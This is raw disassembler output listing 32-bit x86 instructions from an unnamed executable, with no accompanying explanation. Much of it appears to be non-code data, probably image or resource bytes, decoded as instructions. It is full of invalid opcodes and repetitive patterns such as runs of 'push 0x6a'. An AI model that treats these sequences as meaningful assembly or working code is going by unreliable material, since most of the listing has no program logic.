  40a62f:	add    BYTE PTR [eax],al
  40a631:	add    BYTE PTR [edi-0x1f],dh
  40a634:	(bad)  
  40a635:	std    
  40a636:	hlt    
  40a637:	pop    ebp
  40a638:	dec    esi
  40a639:	ja     0x40a6b2
  40a63b:	ja     0x40a6b4
  40a63d:	ja     0x40a6b6
  40a63f:	ja     0x40a6b8
  40a641:	ja     0x40a6ba
  40a643:	ja     0x40a6bc
  40a645:	ja     0x40a6a8
  40a647:	add    BYTE PTR [eax],al
  40a649:	add    BYTE PTR [eax],al
  40a64b:	dec    esi
  40a64c:	daa    
  40a64d:	iret   
  40a64e:	std    
  40a64f:	(bad)  
  40a650:	(bad)  
  40a651:	(bad)  
  40a652:	hlt    
  40a653:	pushf  
  40a654:	or     esp,DWORD PTR [eax+eax*1-0x7b000000]
  40a65b:	loope  0x40a65b
  40a65d:	hlt    
  40a65e:	mov    dh,BYTE PTR [ebx-0x1010104]
  40a664:	(bad)  
  40a665:	(bad)  
  40a666:	(bad)  
  40a667:	(bad)  
  40a668:	(bad)  
  40a669:	(bad)  
  40a66a:	(bad)  
  40a66b:	(bad)  
  40a66c:	(bad)  
  40a66d:	(bad)  
  40a66e:	popf   
  40a66f:	add    BYTE PTR [eax],al
  40a671:	add    BYTE PTR [esi+0x3a],ch
  40a674:	shl    edi,cl
  40a676:	std    
  40a677:	(bad)  
  40a678:	(bad)  
  40a679:	(bad)  
  40a67a:	(bad)  
  40a67b:	(bad)  
  40a67c:	mov    bl,0xb
  40a67e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a67f:	add    BYTE PTR [eax],al
  40a681:	add    BYTE PTR [ebp+0x6777f6e1],al
  40a687:	mov    esp,0xc2c2c3c3
  40a68c:	ret    0xc2c2
  40a68f:	ret    0xc2c2
  40a692:	ret    0xc2c2
  40a695:	rol    DWORD PTR [edx+0x27000000],0xba
  40a69c:	icebp  
  40a69d:	in     al,dx
  40a69e:	ficomp DWORD PTR [edi-0x1235fe8]
  40a6a4:	(bad)  
  40a6a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6a6:	or     DWORD PTR [eax],eax
  40a6a8:	add    BYTE PTR [eax],al
  40a6aa:	test   ecx,esp
  40a6ac:	popa   
  40a6ad:	(bad)
  40a6b1:	push   0x6a
  40a6b3:	push   0x6a
  40a6b5:	stos   BYTE PTR es:[edi],al
  40a6b6:	push   0x6a
  40a6b8:	push   0x6a
  40a6ba:	push   0x6a
  40a6bc:	push   0x6a
  40a6be:	add    BYTE PTR [bx+si],al
  40a6c1:	outs   dx,BYTE PTR ds:[esi]
  40a6c2:	(bad)  
  40a6c3:	loopne 0x40a6b1
  40a6c5:	mov    ds:0x1313151d,al
  40a6ca:	pop    ss
  40a6cb:	fdiv   st(6),st
  40a6cd:	cli    
  40a6ce:	xor    esp,DWORD PTR [esi+0x2e7b0000]
  40a6d4:	mov    edx,0x6a6a6ac2
  40a6d9:	push   0x6a
  40a6db:	push   0x6a
  40a6dd:	push   0x6a
  40a6df:	push   0x6a
  40a6e1:	push   0x6a
  40a6e3:	push   0x6a
  40a6e5:	push   0x67
  40a6e7:	add    BYTE PTR [eax],al
  40a6e9:	sub    ch,BYTE PTR [ebx+0x1920e6e8]
  40a6ef:	push   ss
  40a6f0:	adc    al,0x13
  40a6f2:	adc    esp,DWORD PTR [eax+0x458afefe]
  40a6f8:	add    BYTE PTR [eax],al
  40a6fa:	test   DWORD PTR [ecx-0x4],ecx
  40a6fd:	icebp  
  40a6fe:	push   0x6a
  40a700:	push   0x6a
  40a702:	push   0x6a
  40a704:	push   0x6a
  40a706:	push   0x6a
  40a708:	push   0x6a
  40a70a:	push   0x6a
  40a70c:	push   0x6a
  40a70e:	add    BYTE PTR [bx+si],al
  40a711:	cmp    al,dl
  40a713:	jmp    0x1416:0x191b1eec
  40a71a:	adc    ebx,DWORD PTR [eax]
  40a71c:	(bad)  
  40a71d:	inc    dl
  40a71f:	add    BYTE PTR cs:[eax],al
  40a722:	stos   DWORD PTR es:[edi],eax
  40a723:	push   ecx
  40a724:	(bad)  
  40a725:	out    0x6a,al
  40a727:	push   0x6a
  40a729:	push   0xffffffaa
  40a72b:	push   0x6a
  40a72d:	push   0x6a
  40a72f:	stos   BYTE PTR es:[edi],al
  40a730:	push   0x6a
  40a732:	push   0x6a
  40a734:	push   0x6a
  40a736:	add    BYTE PTR [bx+si],al
  40a739:	xor    eax,0x1feaeaba
  40a73e:	sbb    ebx,DWORD PTR [ebx]
  40a740:	sbb    DWORD PTR [esi],edx
  40a742:	adc    eax,0xb1fefe9f
  40a747:	aaa    
  40a748:	add    BYTE PTR [eax],al
  40a74a:	stos   DWORD PTR es:[edi],eax
  40a74b:	pop    esp
  40a74c:	(bad)  
  40a74d:	jmp    0x40a7b9
  40a74f:	push   0x6a
  40a751:	push   0x6a
  40a753:	push   0x6a
  40a755:	push   0x6a
  40a757:	push   0x6a
  40a759:	push   0x6a
  40a75b:	push   0x6a
  40a75d:	push   0x66
  40a75f:	add    BYTE PTR [eax],al
  40a761:	push   ebp
  40a762:	xchg   ecx,eax
  40a763:	jmp    0x191b:0x1b1ca1e6
  40a76a:	sbb    eax,0x4efefeda
  40a76f:	jae    0x40a771
  40a771:	add    BYTE PTR [ebx+0x6aebfe5c],ch
  40a777:	push   0x6a
  40a779:	push   0x6a
  40a77b:	push   0x6a
  40a77d:	push   0x6a
  40a77f:	push   0x6a
  40a781:	push   0x6a
  40a783:	push   0x6a
  40a785:	push   0x67
  40a787:	add    BYTE PTR [eax],al
  40a789:	add    BYTE PTR [edx+eax*8-0x16],cl
  40a78d:	(bad)  [ecx-0x5cdfe1e1]
  40a793:	icebp  
  40a794:	cli    
  40a795:	iret   
  40a796:	add    eax,0xab000000
  40a79b:	push   ecx
  40a79c:	(bad)  
  40a79d:	out    0x6a,al
  40a79f:	push   0x6a
  40a7a1:	push   0x6a
  40a7a3:	push   0x6a
  40a7a5:	push   0x6a
  40a7a7:	push   0x6a
  40a7a9:	push   0x6a
  40a7ab:	push   0x6a
  40a7ad:	push   0x67
  40a7af:	add    BYTE PTR [eax],al
  40a7b1:	add    BYTE PTR [edx],ch
  40a7b3:	jae    0x40a789
  40a7b5:	jmp    0xecf1:0xe6eceaea
  40a7bc:	ret    0x5427
  40a7bf:	add    BYTE PTR [eax],al
  40a7c1:	add    BYTE PTR [ebx-0x551401a4],ch
  40a7c7:	stos   BYTE PTR es:[edi],al
  40a7c8:	stos   BYTE PTR es:[edi],al
  40a7c9:	stos   BYTE PTR es:[edi],al
  40a7ca:	stos   BYTE PTR es:[edi],al
  40a7cb:	stos   BYTE PTR es:[edi],al
  40a7cc:	stos   BYTE PTR es:[edi],al
  40a7cd:	stos   BYTE PTR es:[edi],al
  40a7ce:	stos   BYTE PTR es:[edi],al
  40a7cf:	stos   BYTE PTR es:[edi],al
  40a7d0:	stos   BYTE PTR es:[edi],al
  40a7d1:	stos   BYTE PTR es:[edi],al
  40a7d2:	stos   BYTE PTR es:[edi],al
  40a7d3:	stos   BYTE PTR es:[edi],al
  40a7d4:	stos   BYTE PTR es:[edi],al
  40a7d5:	stos   BYTE PTR es:[edi],al
  40a7d6:	ja     0x40a7d8
  40a7d8:	add    BYTE PTR [eax],al
  40a7da:	add    BYTE PTR [ecx],ch
  40a7dc:	jae    0x40a7b2
  40a7de:	jmp    0x3dba:0xe6ecece6
  40a7e5:	dec    ecx
  40a7e6:	add    BYTE PTR [eax],al
  40a7e8:	add    BYTE PTR [eax],al
  40a7ea:	stos   DWORD PTR es:[edi],eax
  40a7eb:	push   ecx
  40a7ec:	(bad)  
  40a7ed:	(bad)  
  40a7ee:	(bad)  
  40a7ef:	(bad)  
  40a7f0:	(bad)  
  40a7f1:	(bad)  
  40a7f2:	(bad)  
  40a7f3:	(bad)  
  40a7f4:	(bad)  
  40a7f5:	(bad)  
  40a7f6:	(bad)  
  40a7f7:	(bad)  
  40a7f8:	(bad)  
  40a7f9:	(bad)  
  40a7fa:	(bad)  
  40a7fb:	(bad)  
  40a7fc:	(bad)  
  40a7fd:	(bad)  
  40a7fe:	popf   
  40a7ff:	add    BYTE PTR [eax],al
  40a801:	add    BYTE PTR [eax],al
  40a803:	add    BYTE PTR ds:0xc2ba8555,dh
  40a809:	stos   DWORD PTR es:[edi],eax
  40a80a:	jae    0x40a836
  40a80c:	bound  eax,QWORD PTR [eax]
  40a80e:	add    BYTE PTR [eax],al
  40a810:	add    BYTE PTR [eax],al
  40a812:	stos   DWORD PTR es:[edi],eax
  40a813:	pop    esp
  40a814:	mov    dh,0xb6
  40a816:	lds    esi,FWORD PTR [esi-0x4935443b]
  40a81c:	les    edi,FWORD PTR [esi-0x4149354a]
  40a822:	mov    ebx,0x77b6cab6
  40a827:	add    BYTE PTR [eax],al
  40a829:	add    BYTE PTR [eax],al
  40a82b:	add    BYTE PTR [eax],al
  40a82d:	add    BYTE PTR [ebx],bh
  40a82f:	xor    eax,0x542a3a
  40a834:	add    BYTE PTR [eax],al
  40a836:	add    BYTE PTR [eax],al
  40a838:	add    BYTE PTR [eax],al
  40a83a:	stos   DWORD PTR es:[edi],eax
  40a83b:	push   ecx
  40a83c:	pop    esp
  40a83d:	pop    esp
  40a83e:	push   ecx
  40a83f:	pop    esp
  40a840:	dec    esi
  40a841:	push   ecx
  40a842:	dec    esi
  40a843:	push   ecx
  40a844:	pop    esp
  40a845:	push   ecx
  40a846:	pop    esp
  40a847:	dec    esi
  40a848:	push   ecx
  40a849:	push   ecx
  40a84a:	pop    esp
  40a84b:	push   ecx
  40a84c:	push   ecx
  40a84d:	dec    edi
  40a84e:	pop    esp
	...
  40a877:	add    bh,bh
  40a879:	(bad)  
  40a87a:	(bad)  
  40a87b:	(bad)  
  40a87c:	inc    DWORD PTR [eax]
  40a87e:	add    BYTE PTR [eax],al
  40a880:	(bad)  
  40a881:	(bad)  
  40a882:	(bad)  
  40a883:	clc    
  40a884:	jg     0x40a886
  40a886:	add    BYTE PTR [eax],al
  40a888:	(bad)  
  40a889:	(bad)  
  40a88a:	push   eax
  40a88c:	jg     0x40a88e
  40a88e:	add    BYTE PTR [eax],al
  40a890:	(bad)  
  40a891:	(bad)  
  40a892:	push   eax
  40a894:	jg     0x40a896
  40a896:	add    BYTE PTR [eax],al
  40a898:	(bad)  
  40a899:	(bad)  
  40a89a:	push   eax
  40a89c:	inc    DWORD PTR [eax]
  40a89e:	add    BYTE PTR [eax],al
  40a8a0:	cld    
  40a8a1:	pop    ds
  40a8a2:	jmp    eax
  40a8a4:	inc    DWORD PTR [eax]
  40a8a6:	add    BYTE PTR [eax],al
  40a8a8:	lock pop es
  40a8aa:	inc    ecx
  40a8ac:	inc    DWORD PTR [eax]
  40a8ae:	add    BYTE PTR [eax],al
  40a8b0:	loopne 0x40a8b5
  40a8b2:	iret   
  40a8b3:	sar    edi,0x0
  40a8b6:	add    BYTE PTR [eax],al
  40a8b8:	rol    BYTE PTR [ecx],0xc7
  40a8bb:	cmp    edi,0x0
  40a8be:	add    BYTE PTR [eax],al
  40a8c0:	rol    BYTE PTR [ecx],0xc3
  40a8c3:	cmp    edi,0x0
  40a8c6:	add    BYTE PTR [eax],al
  40a8c8:	add    BYTE PTR [eax],0xc1
  40a8cb:	pop    es
  40a8cc:	inc    DWORD PTR [eax]
  40a8ce:	add    BYTE PTR [eax],al
  40a8d0:	add    BYTE PTR [eax],0xc0
  40a8d3:	pop    es
  40a8d4:	inc    DWORD PTR [eax]
  40a8d6:	add    BYTE PTR [eax],al
  40a8d8:	add    BYTE PTR [eax],0xc0
  40a8db:	ud0    eax,DWORD PTR [eax]
  40a8de:	add    BYTE PTR [eax],al
  40a8e0:	add    BYTE PTR [eax],0xc0
  40a8e3:	add    BYTE PTR [edi],cl
  40a8e5:	add    BYTE PTR [eax],al
  40a8e7:	add    BYTE PTR [eax+0x1f00c000],al
  40a8ed:	add    BYTE PTR [eax],al
  40a8ef:	add    al,al
  40a8f1:	add    eax,eax
  40a8f3:	add    BYTE PTR [edi],bh
  40a8f5:	add    BYTE PTR [eax],al
  40a8f7:	add    al,al
  40a8f9:	add    eax,eax
  40a8fb:	add    BYTE PTR [edi+0x0],bh
  40a8fe:	add    BYTE PTR [eax],al
  40a900:	loopne 0x40a905
  40a902:	rol    BYTE PTR [eax],0xff
  40a905:	add    BYTE PTR [eax],al
  40a907:	add    al,dh
  40a909:	pop    es
  40a90a:	rol    BYTE PTR [ecx],0xff
  40a90d:	add    BYTE PTR [eax],al
  40a90f:	add    ah,bh
  40a911:	pop    ds
  40a912:	rol    BYTE PTR [ebx],0xff
  40a915:	add    BYTE PTR [eax],al
  40a917:	add    bh,bh
  40a919:	inc    eax
  40a91b:	pop    es
  40a91c:	inc    DWORD PTR [eax]
  40a91e:	add    BYTE PTR [eax],al
  40a920:	(bad)  
  40a921:	inc    eax
  40a923:	ud0    eax,DWORD PTR [eax]
  40a926:	add    BYTE PTR [eax],al
  40a928:	(bad)  
  40a929:	inc    eax
  40a92b:	pop    ds
  40a92c:	inc    DWORD PTR [eax]
  40a92e:	add    BYTE PTR [eax],al
  40a930:	(bad)  
  40a931:	inc    eax
  40a933:	aas    
  40a934:	inc    DWORD PTR [eax]
  40a936:	add    BYTE PTR [eax],al
  40a938:	cld    
  40a939:	pop    ds
  40a93a:	rol    BYTE PTR [eax],0x1
  40a93d:	add    BYTE PTR [eax],al
  40a93f:	add    al,dh
  40a941:	pop    es
  40a942:	rol    BYTE PTR [eax],0x1
  40a945:	add    BYTE PTR [eax],al
  40a947:	add    al,ah
  40a949:	add    eax,eax
  40a94b:	add    BYTE PTR [ecx],al
  40a94d:	add    BYTE PTR [eax],al
  40a94f:	add    al,al
  40a951:	add    eax,eax
  40a953:	add    BYTE PTR [ecx],al
  40a955:	add    BYTE PTR [eax],al
  40a957:	add    al,al
  40a959:	add    eax,eax
  40a95b:	add    BYTE PTR [ecx],al
  40a95d:	add    BYTE PTR [eax],al
  40a95f:	add    BYTE PTR [eax+0x100c000],al
  40a965:	add    BYTE PTR [eax],al
  40a967:	add    BYTE PTR [eax+0x100c000],al
  40a96d:	add    BYTE PTR [eax],al
  40a96f:	add    BYTE PTR [eax+0x100c000],al
  40a975:	add    BYTE PTR [eax],al
  40a977:	add    BYTE PTR [eax+0x100c000],al
  40a97d:	add    BYTE PTR [eax],al
  40a97f:	add    BYTE PTR [eax+0x100c000],al
  40a985:	add    BYTE PTR [eax],al
  40a987:	add    al,al
  40a989:	add    eax,eax
  40a98b:	add    BYTE PTR [ecx],al
  40a98d:	add    BYTE PTR [eax],al
  40a98f:	add    al,al
  40a991:	add    eax,eax
  40a993:	add    BYTE PTR [ecx],al
  40a995:	add    BYTE PTR [eax],al
  40a997:	add    al,ah
  40a999:	add    eax,eax
  40a99b:	add    BYTE PTR [ecx],al
  40a99d:	add    BYTE PTR [eax],al
  40a99f:	add    al,dh
  40a9a1:	pop    es
  40a9a2:	rol    BYTE PTR [eax],0x1
  40a9a5:	add    BYTE PTR [eax],al
  40a9a7:	add    ah,bh
  40a9a9:	pop    ds
  40a9aa:	rol    BYTE PTR [eax],0x1
  40a9ad:	add    BYTE PTR [eax],al
  40a9af:	add    bh,bh
  40a9b1:	(bad)  
  40a9b2:	(bad)  
  40a9b3:	(bad)  
  40a9b4:	inc    DWORD PTR [eax]
  40a9b6:	add    BYTE PTR [eax],al
  40a9b8:	sub    BYTE PTR [eax],al
  40a9ba:	add    BYTE PTR [eax],al
  40a9bc:	and    BYTE PTR [eax],al
  40a9be:	add    BYTE PTR [eax],al
  40a9c0:	inc    eax
  40a9c1:	add    BYTE PTR [eax],al
  40a9c3:	add    BYTE PTR [ecx],al
  40a9c5:	add    BYTE PTR [eax],cl
  40a9c7:	add    BYTE PTR [eax],al
  40a9c9:	add    BYTE PTR [eax],al
  40a9cb:	add    BYTE PTR [eax],al
  40a9cd:	add    al,0x0
	...
  40a9d7:	add    BYTE PTR [eax],al
  40a9d9:	add    DWORD PTR [eax],eax
  40a9db:	add    BYTE PTR [eax],al
  40a9dd:	add    DWORD PTR [eax],eax
  40a9df:	add    BYTE PTR [edx-0x8ffdeab],al
  40a9e5:	sar    BYTE PTR [ecx+0x6687a300],1
  40a9eb:	add    dh,ah
  40a9ed:	jmp    0x5a:0x80a100ea
  40a9f4:	jecxz  0x40a9dd
  40a9f6:	out    0x0,eax
  40a9f8:	div    ch
  40a9fa:	repz add BYTE PTR [edx-0x61ffa47f],ah
  40aa01:	jg     0x40aa5e
  40aa03:	add    ch,dh
  40aa05:	hlt    
  40aa06:	repnz add dl,ch
  40aa09:	jecxz  0x40a9e5
  40aa0b:	add    ah,ch
  40aa0d:	out    dx,eax
  40aa0e:	out    dx,eax
  40aa0f:	add    BYTE PTR [ebp-0x5eff9170],ch
  40aa15:	sbb    DWORD PTR [ebx+0x0],0x5c81a2
  40aa1c:	jmp    0xd941970d
  40aa21:	retf   
  40aa22:	mov    esp,0x698ba700
  40aa27:	add    al,dh
  40aa29:	icebp  
  40aa2a:	lock add al,cl
  40aa2d:	mov    esi,0xf7f600ae
  40aa32:	test   DWORD PTR [eax],0xfcfcfb
  40aa38:	clc    
  40aa39:	stc    
  40aa3a:	stc    
  40aa3b:	add    cl,bh
  40aa3d:	cli    
  40aa3e:	cli    
  40aa3f:	add    dh,dl
  40aa41:	leave  
  40aa42:	mov    edx,0xdfe1df00
  40aa47:	add    BYTE PTR [edi-0x3aff8f6f],ch
  40aa4d:	mov    edx,0x97ad00ab
  40aa52:	xchg   BYTE PTR [eax],al
  40aa54:	call   0xe1419645
  40aa59:	in     eax,0xe5
  40aa5b:	add    ah,ch
  40aa5d:	out    dx,al
  40aa5e:	in     eax,dx
  40aa5f:	add    ch,bh
  40aa61:	std    
  40aa62:	std    
  40aa63:	add    ah,bh
  40aa65:	lock call 0xed2e946b
  40aa6b:	add    BYTE PTR [edx-0x15ffad88],bl
  40aa71:	in     eax,dx
  40aa72:	in     eax,dx
  40aa73:	add    dh,ah
  40aa75:	out    dx,al
  40aa76:	call   0xf5369e7b
  40aa7b:	add    al,ch
  40aa7d:	in     al,dx
  40aa7e:	in     al,dx
  40aa7f:	add    bh,dh
  40aa81:	sar    BYTE PTR [eax+eax*1+0xf0f0f0],cl
  40aa88:	fxch   st(4)
  40aa8a:	mov    esp,0xeeeeec00
  40aa8f:	add    bl,bh
  40aa91:	jmp    0xbb:0xd2f700df
  40aa98:	cmc    
  40aa99:	hlt    
  40aa9a:	hlt    
  40aa9b:	add    cl,dh
  40aa9d:	repz repz add bl,bh
  40aaa1:	call   0xf12eab82
  40aaa6:	out    dx,al
  40aaa7:	add    dl,dh
  40aaa9:	repnz lock add bl,ch
  40aaad:	out    dx,al
  40aaae:	out    dx,al
  40aaaf:	add    ch,bl
  40aab1:	rol    ebx,1
  40aab3:	add    dh,bh
  40aab5:	clc    
  40aab6:	hlt    
  40aab7:	add    bh,dh
  40aab9:	div    ebp
  40aabb:	add    bl,dh
  40aabd:	cmc    
  40aabe:	cmc    
  40aabf:	add    bl,al
  40aac1:	mov    ecx,0xf2f200a9
  40aac6:	icebp  
  40aac7:	add    bl,dl
  40aac9:	enter  0xba,0xef
  40aacd:	icebp  
  40aace:	icebp  
  40aacf:	add    bh,cl
  40aad1:	ret    
  40aad2:	mov    bl,0x0
  40aad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aad5:	test   DWORD PTR [eax+0x0],esp
  40aad8:	rol    ch,cl
  40aada:	mov    dh,0x0
  40aadc:	out    0xeb,eax
  40aade:	jmp    0x40aae0
  40aae0:	(bad)  
  40aae1:	mov    edi,0xddf900b1
  40aae6:	int3   
  40aae7:	add    BYTE PTR [eax-0x72ff6534],bl
  40aaed:	cmp    BYTE PTR gs:[eax],al
  40aaf0:	sahf   
  40aaf1:	shl    BYTE PTR [eax+0x4dbf4a00],cl
  40aaf7:	add    BYTE PTR [esp+edi*2-0x605ffa9],bl
  40aafe:	clc    
  40aaff:	add    dh,ch
  40ab01:	lock out dx,eax
  40ab03:	add    BYTE PTR [esi-0x1aff5624],ah
  40ab09:	jmp    0x6fd4abf7
  40ab0e:	inc    ebp
  40ab0f:	add    bh,ah
  40ab11:	jmp    0x40aafd
  40ab13:	add    ah,bh
  40ab15:	jmp    0x40aaf9
  40ab17:	add    dh,bh
  40ab19:	sti    
  40ab1a:	clc    
  40ab1b:	add    al,bh
  40ab1d:	aam    0xbf
  40ab1f:	add    al,bh
  40ab21:	(bad)  
  40ab22:	ret    0x9900
  40ab25:	jns    0x40ab7a
  40ab27:	add    al,bh
  40ab29:	xlat   BYTE PTR ds:[ebx]
  40ab2a:	les    eax,FWORD PTR [eax]
  40ab2c:	and    edx,DWORD PTR [esi+0x5a850026]
  40ab32:	sub    BYTE PTR [eax],al
  40ab34:	repz hlt 
  40ab36:	icebp  
  40ab37:	add    dh,bh
  40ab39:	cld    
  40ab3a:	stc    
  40ab3b:	add    BYTE PTR [edi-0x16ffa17f],bl
  40ab41:	in     al,dx
  40ab42:	jmp    0x40ab44
  40ab44:	sti    
  40ab45:	call   0xf02eac27
  40ab4a:	out    dx,al
  40ab4b:	add    ch,bh
  40ab4d:	icebp  
  40ab4e:	jmp    0x40ab50
  40ab50:	aas    
  40ab51:	ret    
  40ab52:	inc    ebx
  40ab53:	add    BYTE PTR [esi],ah
  40ab55:	test   al,0x29
  40ab57:	add    bl,bh
  40ab59:	in     eax,0xd9
  40ab5b:	add    cl,bh
  40ab5d:	fmul   st(2),st
  40ab5f:	add    bh,dh
  40ab61:	aam    0xbf
  40ab63:	add    bl,ch
  40ab65:	in     al,dx
  40ab66:	in     al,dx
  40ab67:	add    cl,bh
  40ab69:	fcmovne st,st(1)
  40ab6b:	add    BYTE PTR [eax],ah
  40ab6d:	mov    ds:0xe2fa0022,al
  40ab72:	aam    0x0
  40ab74:	and    DWORD PTR [ecx-0x401ffdf],esp
  40ab7a:	stc    
  40ab7b:	add    cl,bh
  40ab7d:	fcmovne st,st(2)
  40ab7f:	add    dl,bh
  40ab81:	out    0xda,eax
  40ab83:	add    dl,bh
  40ab85:	loop   0x40ab5a
  40ab87:	add    dl,bh
  40ab89:	out    0xd9,al
  40ab8b:	add    BYTE PTR [eax-0x1ffd3a3],cl
  40ab91:	cmc    
  40ab92:	lock add BYTE PTR ds:0xfa0038b9,dh
  40ab99:	loope  0x40ab6d
  40ab9b:	add    dh,bh
  40ab9d:	cld    
  40ab9e:	cld    
  40ab9f:	add    cl,bh
  40aba1:	fld    st(7)
  40aba3:	add    cl,dh
  40aba5:	repnz icebp 
  40aba7:	add    dh,dl
  40aba9:	retf   
  40abaa:	mov    ebp,0xf8fafe00
  40abaf:	add    ah,dh
  40abb1:	repz repnz add BYTE PTR [ecx-0x2b],dl
  40abb6:	push   ebp
  40abb7:	add    ah,bh
  40abb9:	in     al,dx
  40abba:	in     al,0x0
  40abbc:	cld    
  40abbd:	jmp    0x6ad0aca0
  40abc2:	add    BYTE PTR ds:[edx-0x18ffab86],bl
  40abc9:	jmp    0xef:0xf1f000ea
  40abd0:	xchg   DWORD PTR [esp+ebp*1+0x0],ebx
  40abd4:	cli    
  40abd5:	loopne 0x40aba6
  40abd7:	add    bl,bh
  40abd9:	in     al,0xd6
  40abdb:	add    BYTE PTR [esi-0xffb38c],dl
  40abe1:	std    
  40abe2:	cld    
  40abe3:	add    ah,bh
  40abe5:	in     al,dx
  40abe6:	jecxz  0x40abe8
  40abe8:	cli    
  40abe9:	in     eax,0xd8
  40abeb:	add    ch,ch
  40abed:	repz out dx,al
  40abef:	add    al,bh
  40abf1:	xlat   BYTE PTR ds:[ebx]
  40abf2:	ret    
  40abf3:	add    ah,bh
  40abf5:	in     eax,dx
  40abf6:	in     al,0x0
  40abf8:	and    al,0x96
  40abfa:	and    al,0x0
  40abfc:	cld    
  40abfd:	out    dx,al
  40abfe:	in     eax,0x0
  40ac00:	cli    
  40ac01:	fmulp  st(6),st
  40ac03:	add    ah,ch
  40ac05:	out    dx,eax
  40ac06:	out    dx,al
  40ac07:	add    ah,bh
  40ac09:	out    dx,al
  40ac0a:	out    0x0,al
  40ac0c:	not    ecx
  40ac0e:	mov    ebx,0xc8daf900
  40ac13:	add    bh,dh
  40ac15:	aam    0xc0
  40ac17:	add    bl,ch
  40ac19:	in     eax,dx
  40ac1a:	in     eax,dx
  40ac1b:	add    dl,bh
  40ac1d:	(bad)  
  40ac1f:	add    BYTE PTR [edi],ah
  40ac21:	test   al,0x2a
  40ac23:	add    ah,bh
  40ac25:	icebp  
  40ac26:	jmp    0xd900:0xeff5fe00
  40ac2d:	retf   
  40ac2e:	mov    ebx,0xfcfdfe00
  40ac33:	add    BYTE PTR [edx-0x7ffac87],bl
  40ac39:	fadd   st,st(5)
  40ac3b:	add    ch,bh
  40ac3d:	repz out dx,al
  40ac3f:	add    ch,bh
  40ac41:	lock jmp 0xcc1ea547
  40ac47:	add    bl,ch
  40ac49:	out    dx,al
  40ac4a:	in     eax,dx
  40ac4b:	add    dh,bl
  40ac4d:	call   0xe13aad34
  40ac52:	rol    DWORD PTR [eax],1
  40ac54:	xchg   edi,eax
  40ac55:	enter  0x98,0xf4
  40ac59:	hlt    
  40ac5a:	icebp  
  40ac5b:	add    ch,bh
  40ac5d:	hlt    
  40ac5e:	out    dx,eax
  40ac5f:	add    al,bh
  40ac61:	aad    0xc0
  40ac63:	add    BYTE PTR [ebp-0x5ff655c],dh
  40ac69:	(bad)  
  40ac6b:	add    dl,bh
  40ac6d:	loope  0x40ac40
  40ac6f:	add    dh,bh
  40ac71:	clc    
  40ac72:	repz add dl,bh
  40ac75:	jecxz  0x40ac4c
  40ac77:	add    bl,bh
  40ac79:	in     al,0xd7
  40ac7b:	add    BYTE PTR [eax],dl
  40ac7d:	xchg   edx,eax
  40ac7e:	adc    eax,DWORD PTR [eax]
  40ac80:	test   eax,0xfa006387
  40ac85:	fmulp  st(5),st
  40ac87:	add    dh,dl
  40ac89:	retf   0xbd
  40ac8c:	std    
  40ac8d:	hlt    
  40ac8e:	out    dx,al
  40ac8f:	add    BYTE PTR [edi],bh
  40ac91:	ret    
  40ac92:	inc    edx
  40ac93:	add    ah,dh
  40ac95:	repz icebp 
  40ac97:	add    ch,bh
  40ac99:	div    bl
  40ac9b:	add    al,bh
  40ac9d:	(bad)  
  40ac9e:	ret    
  40ac9f:	add    BYTE PTR [edi-0x75ff6737],dl
  40aca5:	pusha  
  40aca6:	xor    al,BYTE PTR [eax]
  40aca8:	pushf  
  40aca9:	jge    0x40ad03
  40acab:	add    BYTE PTR [eax-0x6ffaf89],bl
  40acb1:	fxch   st(0)
  40acb3:	add    BYTE PTR [edi+edx*2-0x6246ffdc],al
  40acba:	jg     0x40acbc
  40acbc:	mov    edi,0xff00b2b4
  40acc1:	(bad)  
  40acc2:	inc    DWORD PTR [eax]
	...
  40ade0:	mov    ecx,0xb9b9b9b9
  40ade5:	mov    ecx,0xb9b9b9b9
  40adea:	mov    ecx,0xb9b9b9b9
  40adef:	mov    ecx,0xb9b9b9b9
  40adf4:	mov    ecx,0xb9b9b9b9
  40adf9:	mov    ecx,0xb9b9b9b9
  40adfe:	mov    ecx,0xb9b9b9b9
  40ae03:	mov    ecx,0xb9b9b9b9
  40ae08:	mov    ecx,0xb9b9b9b9
  40ae0d:	mov    ecx,0xb9b9b9b9
  40ae12:	mov    ecx,0xb9b9b9b9
  40ae17:	mov    ecx,0xb5b5b9b9
  40ae1c:	mov    ecx,0xb9b9b9b9
  40ae21:	mov    ecx,0xb9b9b9b9
  40ae26:	mov    ecx,0xb9b9b9b9
  40ae2b:	mov    ecx,0xb9b9b9b9
  40ae30:	mov    ecx,0xb9b9b9b9
  40ae35:	mov    ecx,0xb5b9b9b9
  40ae3a:	add    DWORD PTR [ecx],eax
  40ae3c:	mov    ch,0xb9
  40ae3e:	mov    ecx,0xb9b9b9b9
  40ae43:	mov    ecx,0xb504b9b9
  40ae48:	add    al,0xb9
  40ae4a:	mov    ecx,0xb9b9b9b9
  40ae4f:	mov    ecx,0xb9b9b9b9
  40ae54:	mov    ecx,0xb9b9b9b9
  40ae59:	mov    ch,0x1
  40ae5b:	add    DWORD PTR [ebp-0x46464647],esi
  40ae61:	mov    ecx,0xcb5b9b9
  40ae66:	sbb    BYTE PTR [esi],al
  40ae68:	adc    BYTE PTR [edx],bl
  40ae6a:	mov    ch,0xb9
  40ae6c:	mov    ecx,0xb9b9b9b9
  40ae71:	mov    ecx,0xb9b9b9b9
  40ae76:	mov    ecx,0x101b5b9
  40ae7b:	mov    ch,0xb9
  40ae7d:	mov    ecx,0xb9b9b9b9
  40ae82:	mov    ecx,0x6061804
  40ae87:	push   es
  40ae88:	push   es
  40ae89:	inc    edi
  40ae8a:	xor    al,0x3d
  40ae8c:	mov    ecx,0xb9b9b9b9
  40ae91:	mov    ch,0xb9
  40ae93:	mov    ecx,0xb9b9b9b9
  40ae98:	mov    ch,0x1
  40ae9a:	add    DWORD PTR [ebp-0x46464647],esi
  40aea0:	mov    ecx,0x333ab5b9
  40aea5:	cmp    eax,DWORD PTR [esi]
  40aea7:	cmp    eax,DWORD PTR [esi]
  40aea9:	push   es
  40aeaa:	push   es
  40aeab:	xor    al,0xb5
  40aead:	mov    ecx,0x54b9b9b9
  40aeb2:	mov    ch,0xb9
  40aeb4:	mov    ecx,0x1b5b9b9
  40aeb9:	add    DWORD PTR [ebp-0x46464647],esi
  40aebf:	mov    ecx,0x3311b9b9
  40aec4:	xor    esi,DWORD PTR [ebx]
  40aec6:	cmp    eax,DWORD PTR [esi]
  40aec8:	push   es
  40aec9:	push   es
  40aeca:	push   es
  40aecb:	push   es
